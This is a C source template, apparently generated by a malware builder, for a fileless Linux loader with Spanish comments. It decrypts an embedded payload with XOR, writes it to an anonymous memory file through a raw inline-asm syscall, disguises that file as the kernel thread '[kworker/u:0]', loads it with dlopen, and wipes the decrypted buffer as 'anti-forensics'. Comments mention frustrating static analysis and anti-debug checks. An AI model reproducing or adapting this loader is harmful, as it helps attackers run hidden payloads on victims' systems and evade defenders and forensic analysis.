#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <dlfcn.h>
#include <sys/ptrace.h> // Anti-debug headers might be needed here too if checking in loader

extern char **environ;

// ============================================================================
// POLYMORPHIC DATA SECTION
// ============================================================================
// El builder reemplazará estos bloques
{{SECRETS_BLOCK}}

// ============================================================================
// DECRYPTION ROUTINE (XOR Rotativo)
// ============================================================================
void decrypt_payload(unsigned char *data, size_t data_len, const unsigned char *key, size_t key_len) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
        // Rotación simple extra para fastidiar análisis estático trivial
        data[i] = (data[i] << 1) | (data[i] >> 7);
    }
}

int main(int argc, char* argv[]) {
    (void)argc; (void)argv;

    // 1. Decrypt in place (Stack/Data section is RW)
    // Pero si es variable global const/static podría estar en RO.
    // El builder generará arrays sin 'const' para que sean RW.
    // O mejor, copiamos al heap para no modificar .data directamente si el segmento es RO.

    // Obtener referencias via macros generadas
    size_t p_len = {{PAYLOAD_LEN_MACRO}};
    size_t k_len = {{KEY_LEN_MACRO}};

    // Allocate heap buffer to copy and decrypt (avoid .data modification issues)
    unsigned char *payload_buf = (unsigned char *)malloc(p_len);
    if (!payload_buf) return 1;

    memcpy(payload_buf, {{PAYLOAD_VAR_NAME}}, p_len);

    // Decrypt
    // Nota: El XOR rotativo en C debe coincidir con el de Python.
    // Si Python hizo: byte = (byte ^ key) ...
    // Aquí deshacemos.
    // Python (Encrypt): data[i] = (data[i] ^ k) luego ROL? O primero ROL luego XOR?
    // "Leer temp_ghost.so y aplicar XOR rotativo".
    // Asumamos XOR simple para estabilidad o ROL+XOR.
    // Implementaré XOR simple rotativo (key rota) en esta primera versión polimórfica para asegurar éxito.
    // void decrypt_payload_simple(unsigned char *data, size_t len, const unsigned char *key, size_t klen) {
    //    for(size_t i=0; i<len; i++) data[i] ^= key[i % klen];
    // }

    // Usaremos la lógica simple del loop:
    for(size_t i=0; i<p_len; i++) {
        payload_buf[i] ^= {{KEY_VAR_NAME}}[i % k_len];
    }

    // 2. Exec (Stealth memfd via inline asm syscall)
    const char *name = "[kworker/u:0]";
    long fd;

    asm volatile (
        "syscall"
        : "=a" (fd)
        : "a" (319), "D" (name), "S" (0x0001) /* MFD_CLOEXEC */
        : "rcx", "r11", "memory"
    );

    if (fd < 0) {
        free(payload_buf);
        return 1;
    }

    if (write((int)fd, payload_buf, p_len) != (ssize_t)p_len) {
        free(payload_buf);
        close((int)fd);
        return 1;
    }

    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%ld", fd);

    // 3. Stealth Injection (dlopen)
    void* handle = dlopen(fd_path, RTLD_NOW);
    if (!handle) {
        close((int)fd);
        free(payload_buf);
        return 1;
    }

    // 4. Anti-Forensics
    close((int)fd);

    // Scrub heap
    volatile unsigned char *p = payload_buf;
    size_t n = p_len;
    while(n--) *p++ = 0;
    free(payload_buf);

    // Pause to keep alive
    pause();

    return 0;
}
